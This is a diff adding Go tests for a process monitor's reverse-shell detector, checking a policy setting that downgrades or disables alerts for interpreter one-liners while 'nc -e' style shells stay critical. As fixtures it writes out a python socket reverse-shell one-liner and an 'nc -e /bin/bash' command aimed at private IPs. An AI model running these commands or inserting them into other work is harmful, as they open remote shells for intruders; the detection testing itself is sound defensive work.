@@ -3,6 +3,7 @@ package monitor
 import (
 	"strings"
 	"testing"
+	"time"
 )
 
 func TestDetectReverseShells(t *testing.T) {
@@ -109,6 +110,82 @@ func TestDetectReverseShells(t *testing.T) {
 			threats := DetectReverseShells(tt.processes)
 			if len(threats) != tt.wantCount {
 				t.Errorf("DetectReverseShells() got %d threats, want %d", len(threats), tt.wantCount)
+			}
+		})
+	}
+}
+
+// snapshotWith builds a minimal MonitorSnapshot carrying a single process with
+// the given command line, so Analyze() runs the reverse-shell path over it.
+func snapshotWith(command string) MonitorSnapshot {
+	return MonitorSnapshot{
+		Timestamp: time.Unix(0, 0),
+		Processes: ProcessStats{
+			Available: true,
+			Processes: []Process{{PID: 4242, User: "1000", Command: command}},
+		},
+	}
+}
+
+func reverseShellThreats(threats []ThreatEvent) []ThreatEvent {
+	var out []ThreatEvent
+	for _, t := range threats {
+		if t.Category == "process" && t.Title == "Reverse shell detected" {
+			out = append(out, t)
+		}
+	}
+	return out
+}
+
+// TestReverseShellOneLinerPolicy verifies the #842 knob: the interpreter
+// one-liner class (python -c, perl -e, ...) can be downgraded/disabled, while
+// the unambiguous class (nc -e, /dev/tcp/, ...) always stays critical.
+func TestReverseShellOneLinerPolicy(t *testing.T) {
+	// A genuine python one-liner reverse shell (carries socket + IP, so it
+	// passes the network-indicator gate and is classified as a one-liner).
+	oneLinerCmd := `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`
+	// An unambiguous reverse shell — must stay critical under every policy.
+	strongCmd := `nc -e /bin/bash 192.168.1.100 4444`
+
+	tests := []struct {
+		policy         string
+		wantOneLiner   ThreatLevel // "" means "no event emitted"
+		wantStrongKept bool
+	}{
+		{"critical", ThreatLevelCritical, true},
+		{"", ThreatLevelCritical, true},         // empty → safe default
+		{"CRITICAL", ThreatLevelCritical, true}, // case-insensitive
+		{"bogus", ThreatLevelCritical, true},    // unknown → safe default
+		{"warn", ThreatLevelWarning, true},
+		{"off", "", true},
+	}
+
+	for _, tt := range tests {
+		t.Run("policy="+tt.policy, func(t *testing.T) {
+			d := NewDetector(0, 0).WithReverseShellOneLinerPolicy(tt.policy)
+
+			// One-liner class.
+			got := reverseShellThreats(d.Analyze(snapshotWith(oneLinerCmd)))
+			if tt.wantOneLiner == "" {
+				if len(got) != 0 {
+					t.Errorf("policy %q: expected one-liner suppressed, got %d events (level %q)",
+						tt.policy, len(got), got[0].Level)
+				}
+			} else {
+				if len(got) != 1 {
+					t.Fatalf("policy %q: expected 1 one-liner event, got %d", tt.policy, len(got))
+				}
+				if got[0].Level != tt.wantOneLiner {
+					t.Errorf("policy %q: one-liner level = %q, want %q", tt.policy, got[0].Level, tt.wantOneLiner)
+				}
+			}
+
+			// Strong class is never affected by the knob.
+			strong := reverseShellThreats(d.Analyze(snapshotWith(strongCmd)))
+			if tt.wantStrongKept {
+				if len(strong) != 1 || strong[0].Level != ThreatLevelCritical {
+					t.Errorf("policy %q: unambiguous reverse shell must stay CRITICAL, got %+v", tt.policy, strong)
+				}
 			}
 		})
 	}
